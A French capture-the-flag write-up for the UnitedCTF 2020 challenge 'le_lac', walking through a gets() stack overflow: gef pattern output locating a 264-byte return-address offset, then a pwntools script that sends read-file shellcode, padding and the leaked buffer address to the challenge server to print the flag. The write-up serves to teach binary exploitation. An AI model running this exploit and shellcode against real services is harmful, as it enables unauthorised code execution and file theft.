# Write up

La fonction `gets` est dépréciée car elle n'est pas sécuritaire, mais elle existe toujours. Dans la plupart des versions de son `manpage`, on retrouve la phrase "Never use this function.". Cette fonction vulnérable nous permet de dépasser le _buffer_ alloué pour notre nom afin de modifier l'adresse de retour de la fonction `vide` pour pointer sur notre _shellcode_. Pour simplifier les choses, l'adresse du buffer dans lequel on écrit nous est fournie.

> Imaginez un bateau vide qui flotte sur un lac. Tentez de trouver le coquillage dans le bateau vide qui se trouve à <adresse du buffer>

Cette fois, plutôt que de trouver manuellement l'_offset_ de l'addresse de retour, nous utiliserons la fonctionnalité `pattern` de `gef`. Celle-ci génère une [suite de caractères](https://en.wikipedia.org/wiki/De_Bruijn_sequence) dont chaque bloc de la taille d'un pointeur dans l'architecture courante est unique. Ceci peut servir à trouver l'_offset_ d'adresses de retour ou de variables. Il suffit de chercher le motif qui se trouve à l'emplacement visé au moment voulu dans la suite afin de trouver où se trouve celui-ci par rapport au début de notre _buffer_

On génère d'abord le _pattern_:

```
gef➤  pattern create 512
[+] Generating a pattern of 512 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac
[+] Saved as '$_gef0'
```

Ensuite, on lance le programme dans `gdb` et on entre ce pattern lorsque le programme nous demande d'entrer quelque chose:

```
gef➤  run
Starting program: UnitedCTF-2020/challenges/pwning/le_lac/le_lac
Imaginez un bateau vide qui flotte sur un lac. Tentez de trouver le coquillage dans le bateau vide qui se trouve à 0x7fffffffd920
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf
```

Au moment où on atteint le `RET` de la fonction `vide`, le programme lance une erreur de segmentation car il tente de retourner vers une adresse invalide (un bout de notre _pattern_):

```
 → 0x555555555195 <vide+60>        ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "le_lac", stopped 0x555555555195 in vide (), reason: SIGSEGV
```

On peut utiliser la commande `backtrace` pour voir vers quelle adresse il a tenté de retourner:

```
gef➤  backtrace
#0  0x0000555555555195 in vide ()
#1  0x6261616161616169 in ?? ()
[...]
```

On cherche ce motif dans la suite afin d'en obtenir l'_offset_:

```
gef➤  pattern search 0x6261616161616169
[+] Searching '0x6261616161616169'
[+] Found at offset 264 (little-endian search) likely
```

Ceci signifie que le motif que le programme a tenté d'utiliser comme adresse de retour débute 264 bytes après le début. Il faut donc écrire 264 bytes avant d'écrire la nouvelle adresse de retour.

Comme l'adresse de notre buffer change à chaque exécution, nous avons décidé d'écrire un script python qui communiquera avec la programme afin de construire le bon _payload_. Nous utiliserons [pwntools](https://github.com/Gallopsled/pwntools), une bibliothèque python conçu précisément pour l'exploitation binaire.

```python
LEN_BUFFER = 264 #Calculé en utilisant les patterns de gef. pourrait être automatisé

from pwn import * #On importe pwntools

context(arch = "amd64", os = "linux") #Le challenge est un binaire linux x64, on initialise donc le bon contexte
conn = remote("unitedctf.ca", 17002) #On crée une connexion au service du challenge

# On lit l'adresse du buffer qui nous est donnée dans le premier message et on la transforme en entier 64 bits
l = conn.recvline()
addr = int((l.split())[-1], 16)
ret_addr = p64(addr, endian="little", sign="unsigned")

# Un shellcode qui lit un fichier. Adapté à partir de http://shell-storm.org/shellcode/files/shellcode-878.php
shellcode = b"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x66\x6c\x61\x67\x41"

padding = b"A" * (LEN_BUFFER - len(shellcode)) # On calcule la taille du padding nécessaire pour se rendre à l'adresse de retour

# On envoie notre payload en n'oubliant pas le retour de ligne à la fin pour terminer l'entrée de gets
conn.send(shellcode + padding + ret_addr + b"\n")
flag = conn.recvline() #On lit ce que le programme nous retourne. Ça devrait être le contenu de /flag
print(flag.decode("utf-8)) #recvline reçoit des bytes, on les convertit en string avant d'afficher pour que ce soit plus beau
```

Et on obtient le flag FLAG-1magin3_4_5hell_in_4n_3mpty_b0a7_VwVlUe6nUOA !
